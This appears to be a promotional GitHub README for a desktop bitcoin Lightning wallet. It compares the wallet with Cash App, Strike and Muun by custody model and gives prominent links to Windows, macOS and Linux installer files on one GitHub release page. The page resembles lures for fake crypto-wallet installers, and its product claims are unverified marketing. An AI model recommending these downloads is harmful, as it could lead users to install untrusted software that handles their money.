<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>

# Lightning Pay vs Cash App, Strike and Muun

Four products, three custody models, and one question that decides between them.

<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe">lightning-pay-wallet-windows-v1.2.1.exe</a> |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg">lightning-pay-wallet-macos-v1.2.1.dmg</a> |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip">lightning-pay-wallet-linux-v1.2.1.zip</a> |

</div>

Every file above is published on <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1">the Lightning Pay Wallet release page</a> under the same names, and that page is the only place the installers should come from.

> **Only download from this GitHub release page.**

These names appear together in search results because they all move bitcoin quickly. They are not the
same kind of product, and comparing them feature by feature misses the point.

## The one question

Who holds the keys? Cash App and Strike are custodial services: an account, a login, a balance on their
books, and their rules about what you may do with it. Muun is a mobile wallet with its own model, and
this wallet is a desktop, non-custodial application whose keys stay on your machine.

Custody decides what happens when something goes wrong: a login recovers a custodial balance, a phrase
recovers a self-custodial one, and a company failure affects only the first.

## What Cash App and Strike are for

Buying, selling and paying people inside an app ecosystem. They are excellent at that, and they are
regulated services with identity checks, limits and support. If your counterparty is on the same app,
the transfer is trivial.

They are not places to store an amount you would not want frozen, because an account can be restricted.

## What Muun and this wallet are for

Holding bitcoin you control. Muun is mobile-first; this wallet is desktop, with channels managed for
you and a phrase you keep. Neither is a trading desk, and neither will sell you bitcoin.

## What this wallet has that the apps do not

No account to be closed, no identity check in the wallet, no operator able to freeze a balance, and a
recovery path that does not depend on a company existing.

## What the apps have that this wallet does not

A phone build, a card, fiat on-ramps and customer support. Those are real advantages and they are the
reason people use them.

## Choosing

If you want to buy, sell and pay inside one app, a custodial service is the straightforward answer. If
you want to hold bitcoin whose keys you control and spend it over Lightning without an account, a
self-custodial wallet is the only answer, and the rest is a choice of platform.

## Questions people ask

### Which is cheapest?

Routing fees are similar across wallets; the on-chain costs and spreads differ and change. Compare at
the moment you move money.

### Can I move between them?

Yes, by matching the rail: an address for on-chain, an invoice for Lightning.

### Is Cash App self-custodial?

No. It is a custodial service with a Lightning rail in some configurations.

## Related guides

- <a href="https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/best-lightning-wallet-compared.md">Best Bitcoin Lightning wallets compared, including this one</a>
- <a href="https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/cash-app-coinbase-binance-lightning.md">Cash App, Coinbase and Binance: are they Lightning wallets?</a>
- <a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/custodial-vs-non-custodial-wallet.md">Custodial vs non-custodial wallet: which one is actually safer</a>

